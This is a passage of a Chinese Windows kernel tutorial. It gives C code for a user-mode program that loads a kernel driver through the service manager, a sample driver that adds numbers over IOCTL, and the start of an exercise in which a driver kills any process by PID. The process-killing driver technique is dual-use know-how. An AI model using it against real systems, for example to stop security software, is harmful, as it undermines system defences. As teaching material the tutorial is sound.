<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写一个简单的驱动，在驱动入口和卸载函数打印一些提示信息</span></span><br><span class="line"><span class="comment">// 这个驱动可以做加法，3环程序可以给他传两个4字节整数，驱动会返回相加的结果</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_NAME <span class="meta-string">L&quot;MathsDriver&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_PATH <span class="meta-string">L&quot;MathsDriver.sys&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_LINK <span class="meta-string">L&quot;\\\\.\\MathsDriverLnk&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPERADD CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">LoadDriver</span><span class="params">(PCWSTR lpszDriverName, PCWSTR lpszDriverPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 获取驱动完整路径</span></span><br><span class="line">	WCHAR szDriverFullPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	GetFullPathNameW(lpszDriverPath,MAX_PATH,szDriverFullPath,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//printf(&quot;%ws\n&quot;, szDriverFullPath);</span></span><br><span class="line">	<span class="comment">// 打开服务控制管理器</span></span><br><span class="line">	SC_HANDLE hServiceMgr = <span class="literal">NULL</span>; <span class="comment">// SCM管理器句柄	</span></span><br><span class="line">	hServiceMgr = OpenSCManagerW(<span class="literal">NULL</span>,<span class="literal">NULL</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenSCManagerW 失败, %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;打开服务控制管理器成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 创建驱动服务</span></span><br><span class="line">	SC_HANDLE hServiceDDK = <span class="literal">NULL</span>; <span class="comment">// NT驱动程序服务句柄</span></span><br><span class="line">	hServiceDDK = CreateServiceW(</span><br><span class="line">		hServiceMgr,</span><br><span class="line">		lpszDriverName,</span><br><span class="line">		lpszDriverName,</span><br><span class="line">		SERVICE_ALL_ACCESS,</span><br><span class="line">		SERVICE_KERNEL_DRIVER,</span><br><span class="line">		SERVICE_DEMAND_START,</span><br><span class="line">		SERVICE_ERROR_IGNORE,</span><br><span class="line">		szDriverFullPath,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwErr = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwErr != ERROR_IO_PENDING &amp;&amp; dwErr != ERROR_SERVICE_EXISTS)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;创建驱动服务失败, %d\n&quot;</span>, dwErr);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;创建驱动服务成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 驱动服务已经创建，打开服务</span></span><br><span class="line">	hServiceDDK = OpenServiceW(hServiceMgr,lpszDriverName,SERVICE_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (!StartService(hServiceDDK, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwErr = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwErr != ERROR_SERVICE_ALREADY_RUNNING)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;运行驱动服务失败, %d\n&quot;</span>, dwErr);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;运行驱动服务成功.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RunMathDriver</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hDevice = CreateFileW(DRIVER_LINK, GENERIC_READ|GENERIC_WRITE,<span class="number">0</span>,<span class="number">0</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;创建设备失败. %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 加法</span></span><br><span class="line">	DWORD n1 = <span class="number">100</span>, n2 = <span class="number">50</span>;</span><br><span class="line">	BYTE InBuffer[<span class="number">8</span>];</span><br><span class="line">	DWORD OutBuffer;</span><br><span class="line">	<span class="built_in">memcpy</span>(InBuffer,&amp;n1,<span class="number">4</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(InBuffer+<span class="number">4</span>,&amp;n2,<span class="number">4</span>);</span><br><span class="line">	DWORD dwOut;	</span><br><span class="line">	DeviceIoControl(hDevice,OPERADD,InBuffer,<span class="number">8</span>,&amp;OutBuffer,<span class="number">4</span>,&amp;dwOut,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d + %d = %d\n&quot;</span>, n1, n2, OutBuffer);</span><br><span class="line">	<span class="comment">// 关闭设备</span></span><br><span class="line">	CloseHandle(hDevice);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnLoadDriver</span><span class="params">(PCWSTR lpszDriverName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SC_HANDLE hServiceMgr = OpenSCManagerW(<span class="number">0</span>,<span class="number">0</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	SC_HANDLE hServiceDDK = OpenServiceW(hServiceMgr,lpszDriverName,SERVICE_ALL_ACCESS);</span><br><span class="line">	SERVICE_STATUS SvrStatus;</span><br><span class="line">	ControlService(hServiceDDK,SERVICE_CONTROL_STOP,&amp;SvrStatus);</span><br><span class="line">	DeleteService(hServiceDDK);</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!LoadDriver(DRIVER_NAME, DRIVER_PATH))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;加载驱动失败.\n&quot;</span>);</span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	RunMathDriver();</span><br><span class="line">	UnLoadDriver(DRIVER_NAME);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0环驱动程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写一个简单的驱动，在驱动入口和卸载函数打印一些提示信息</span></span><br><span class="line"><span class="comment">// 这个驱动可以做加法，3环程序可以给他传两个4字节整数，驱动会返回相加的结果</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">L&quot;\\Device\\MathsDriverDev&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_LINK <span class="meta-string">L&quot;\\??\\MathsDriverLnk&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPERADD CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegPath)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	ULONG uIndex = <span class="number">0</span>;</span><br><span class="line">	PDEVICE_OBJECT pDeviceObj = <span class="literal">NULL</span>; <span class="comment">// 设备对象指针</span></span><br><span class="line">	UNICODE_STRING DeviceName; <span class="comment">// 设备名，0环用</span></span><br><span class="line">	UNICODE_STRING SymbolicLinkName; <span class="comment">// 符号链接名，3环用</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建设备名称</span></span><br><span class="line">	RtlInitUnicodeString(&amp;DeviceName,DEVICE_NAME);</span><br><span class="line">	<span class="comment">// 创建设备</span></span><br><span class="line">	status = IoCreateDevice(pDriver,<span class="number">0</span>,&amp;DeviceName,FILE_DEVICE_UNKNOWN,FILE_DEVICE_SECURE_OPEN,FALSE,&amp;pDeviceObj);</span><br><span class="line">	<span class="keyword">if</span> (status != STATUS_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		IoDeleteDevice(pDeviceObj);</span><br><span class="line">		DbgPrint(<span class="string">&quot;创建设备失败.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	DbgPrint(<span class="string">&quot;创建设备成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 设置交互数据的方式</span></span><br><span class="line">	pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line">	<span class="comment">// 创建符号链接</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName, DRIVER_LINK);</span><br><span class="line">	IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DeviceName);</span><br><span class="line">	<span class="comment">// 设置分发函数</span></span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceControlProc;</span><br><span class="line">	<span class="comment">// 设置卸载函数</span></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载驱动</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UNICODE_STRING SymbolicLinkName;</span><br><span class="line">	<span class="comment">// 删除符号链接，删除设备</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName, DRIVER_LINK);</span><br><span class="line">	IoDeleteSymbolicLink(&amp;SymbolicLinkName);</span><br><span class="line">	IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动卸载成功\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不设置这个函数，则Ring3调用CreateFile会返回1</span></span><br><span class="line"><span class="comment">// IRP_MJ_CREATE 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层连接设备.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_CLOSE 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层断开连接设备.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_DEVICE_CONTROL 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// DbgPrint(&quot;IrpDeviceControlProc.\n&quot;);</span></span><br><span class="line">	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;</span><br><span class="line">	PIO_STACK_LOCATION pIrpStack;</span><br><span class="line">	ULONG uIoControlCode;</span><br><span class="line">	PVOID pIoBuffer;</span><br><span class="line">	ULONG uInLength;</span><br><span class="line">	ULONG uOutLength;</span><br><span class="line">	ULONG uRead1;</span><br><span class="line">	ULONG uRead2;</span><br><span class="line">	ULONG uWrite;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置临时变量的值</span></span><br><span class="line">	uRead1 = uRead2 = <span class="number">0</span>;</span><br><span class="line">	uWrite = <span class="number">0x12345678</span>;</span><br><span class="line">	<span class="comment">// 获取IRP数据</span></span><br><span class="line">	pIrpStack = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line">	<span class="comment">// 获取控制码</span></span><br><span class="line">	uIoControlCode = pIrpStack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">	<span class="comment">// 获取缓冲区地址（输入输出是同一个）</span></span><br><span class="line">	pIoBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	<span class="comment">// Ring3 发送数据的长度</span></span><br><span class="line">	uInLength = pIrpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">	<span class="comment">// Ring0 发送数据的长度</span></span><br><span class="line">	uOutLength = pIrpStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (uIoControlCode)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> OPERADD:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 读取缓冲区</span></span><br><span class="line">			<span class="built_in">memcpy</span>(&amp;uRead1,pIoBuffer,<span class="number">4</span>);</span><br><span class="line">			<span class="built_in">memcpy</span>(&amp;uRead2,(PUCHAR)pIoBuffer+<span class="number">4</span>,<span class="number">4</span>);			</span><br><span class="line">			uWrite = uRead1 + uRead2;</span><br><span class="line">			<span class="comment">// 写入缓冲区</span></span><br><span class="line">			<span class="built_in">memcpy</span>(pIoBuffer, &amp;uWrite, <span class="number">4</span>);</span><br><span class="line">			<span class="comment">// 设置状态</span></span><br><span class="line">			pIrp-&gt;IoStatus.Information = <span class="number">4</span>;</span><br><span class="line">			status = STATUS_SUCCESS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = status;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1-9-练习：结束指定PID进程"><a href="#1-9-练习：结束指定PID进程" class="headerlink" title="1.9 练习：结束指定PID进程"></a>1.9 练习：结束指定PID进程</h3><p>编写一个3环程序，可以将任意一个进程的PID传递给0环的驱动程序，如果这个进程存在，驱动程序将该进程终结。另外，如果工具可以以一个单文件的形式存在，即不带sys文件，那么看起来会高级不少，然而我现在无法完成该需求，如果你知道怎么做，请在评论中留言，我会转达<a href="https://blog.csdn.net/Kwansy">hambaga</a>。</p>
<p>这个项目基于1.8的练习，3环部分，只需将传递两个4字节加数改成传递一个4字节PID，并且修改一下宏定义中，驱动项目的名字即可。</p>
<p>3环代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span>	<span class="comment">//system(&quot;Pause&quot;);</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_NAME <span class="meta-string">L&quot;MathsDriver&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_PATH <span class="meta-string">L&quot;KillProc.sys&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_LINK <span class="meta-string">L&quot;\\\\.\\MathsDriverLnk&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPERADD CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">LoadDriver</span><span class="params">(PCWSTR lpszDriverName, PCWSTR lpszDriverPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 获取驱动完整路径</span></span><br><span class="line">	WCHAR szDriverFullPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	GetFullPathNameW(lpszDriverPath,MAX_PATH,szDriverFullPath,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%ws\n&quot;</span>, szDriverFullPath);</span><br><span class="line">	<span class="comment">// 打开服务控制管理器</span></span><br><span class="line">	SC_HANDLE hServiceMgr = <span class="literal">NULL</span>; <span class="comment">// SCM管理器句柄	</span></span><br><span class="line">	hServiceMgr = OpenSCManagerW(<span class="literal">NULL</span>,<span class="literal">NULL</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenSCManagerW 失败, %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;打开服务控制管理器成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 创建驱动服务</span></span><br><span class="line">	SC_HANDLE hServiceDDK = <span class="literal">NULL</span>; <span class="comment">// NT驱动程序服务句柄</span></span><br><span class="line">	hServiceDDK = CreateServiceW(</span><br><span class="line">		hServiceMgr,</span><br><span class="line">		lpszDriverName,</span><br><span class="line">		lpszDriverName,</span><br><span class="line">		SERVICE_ALL_ACCESS,</span><br><span class="line">		SERVICE_KERNEL_DRIVER,</span><br><span class="line">		SERVICE_DEMAND_START,</span><br><span class="line">		SERVICE_ERROR_IGNORE,</span><br><span class="line">		szDriverFullPath,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwErr = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwErr != ERROR_IO_PENDING &amp;&amp; dwErr != ERROR_SERVICE_EXISTS)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;创建驱动服务失败, %d\n&quot;</span>, dwErr);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;创建驱动服务成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 驱动服务已经创建，打开服务</span></span><br><span class="line">	hServiceDDK = OpenServiceW(hServiceMgr,lpszDriverName,SERVICE_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (!StartServiceW(hServiceDDK, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwErr = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwErr != ERROR_SERVICE_ALREADY_RUNNING)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;运行驱动服务失败, %d\n&quot;</span>, dwErr);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;运行驱动服务成功.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RunMathDriver</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hDevice = CreateFileW(DRIVER_LINK, GENERIC_READ|GENERIC_WRITE,<span class="number">0</span>,<span class="number">0</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;创建设备失败. %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;创建设备成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 输入要干掉的进程PID</span></span><br><span class="line">	DWORD dwPID = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入要干掉的进程PID:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;dwPID);</span><br><span class="line">	DWORD dwInBuffer;</span><br><span class="line">	DWORD OutBuffer;</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;dwInBuffer,&amp;dwPID,<span class="number">4</span>);</span><br><span class="line">	DWORD dwOut;	</span><br><span class="line">	DeviceIoControl(hDevice,OPERADD,&amp;dwInBuffer,<span class="number">4</span>,&amp;OutBuffer,<span class="number">4</span>,&amp;dwOut,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">switch</span>(OutBuffer)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;进程关闭成功.\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;进程关闭失败.\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 关闭设备</span></span><br><span class="line">	CloseHandle(hDevice);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnLoadDriver</span><span class="params">(PCWSTR lpszDriverName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SC_HANDLE hServiceMgr = OpenSCManagerW(<span class="number">0</span>,<span class="number">0</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	SC_HANDLE hServiceDDK = OpenServiceW(hServiceMgr,lpszDriverName,SERVICE_ALL_ACCESS);</span><br><span class="line">	SERVICE_STATUS SvrStatus;</span><br><span class="line">	ControlService(hServiceDDK,SERVICE_CONTROL_STOP,&amp;SvrStatus);</span><br><span class="line">	DeleteService(hServiceDDK);</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!LoadDriver(DRIVER_NAME, DRIVER_PATH))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;加载驱动失败.\n&quot;</span>);</span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	RunMathDriver();</span><br><span class="line">	UnLoadDriver(DRIVER_NAME);</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 